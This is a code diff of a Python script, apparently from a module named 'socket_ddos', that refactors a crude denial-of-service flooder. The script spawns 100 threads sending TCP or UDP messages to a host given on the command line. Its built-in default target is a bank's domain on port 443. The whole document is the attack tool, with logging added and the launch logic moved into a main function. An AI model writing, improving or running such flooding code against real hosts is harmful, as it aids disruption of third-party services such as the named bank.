@@ -1,9 +1,11 @@
 import socket
 import sys
 import threading
+import sys
+import os
 
 
-def send_tcp(ip, port, send_msg):
+def send_tcp(ip, port, send_msg, log):
 
     send_msg = str.encode(send_msg)
 
@@ -12,21 +14,22 @@ def send_tcp(ip, port, send_msg):
         try:
             s.connect((ip, port))
         except socket.error as e:
-            print('connect error', e)
+            log.error(f'connect error\n {e}')
             return
         s.sendall(send_msg)
         data = s.recv(1024)
         data = bytes.decode(data)
-        print(f"Received {data!r}")
+
+        log.info(f"Received {data!r}")
 
 
-def send_udp(ip, port, send_msg):
+def send_udp(ip, port, send_msg, log):
     with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
         send_msg = str.encode(send_msg)
         s.sendto(send_msg, (ip, port))
         data = s.recvfrom(1024)
         data = bytes.decode(data)
-        print(data)
+        log.info(data)
 
 
 def get_ip_from_url(url: str) -> str:
@@ -37,6 +40,7 @@ def get_ip_from_url(url: str) -> str:
     :return: "142.251.39.46"
     """
     site_ip = False
+
     try:
         site_ip = socket.gethostbyname(url)
     except socket.gaierror:
@@ -54,23 +58,32 @@ def do_threads(n_thread, func, args):
         for ts in threads:
             ts.join()
 
-        # break
+
+def main(host, port, type_conn, log):
+    log.info('Start Programm')
+
+    msg = "Hello world"
+    ip = get_ip_from_url(host)
+    port = int(port)
+    if type_conn.strip() == 'tcp':
+        do_threads(100, send_tcp, (ip, port, msg, log))
+    elif type_conn.strip() == 'udp':
+        do_threads(100, send_udp, (ip, port, msg, log))
+
 
 if __name__ == "__main__":
-    print('start')
-    msg = "Hello world"
+    from socket_ddos import logger
+
     sys.argv.pop(0)
     if data := sys.argv:
         host = data[0]
-        port = int(data[1])
+        port = data[1]
         type_conn = data[2]
     else:
         host = 'my.bank-hlynov.ru'
         port = 443
         type_conn = 'tcp'
 
-    ip = get_ip_from_url(host)
-    if type_conn.strip() == 'tcp':
-        do_threads(100, send_tcp, (ip, port, msg))
-    elif type_conn.strip() == 'udp':
-        do_threads(100, send_udp, (ip, port, msg))
+    main(host, port, type_conn, logger)
+
+
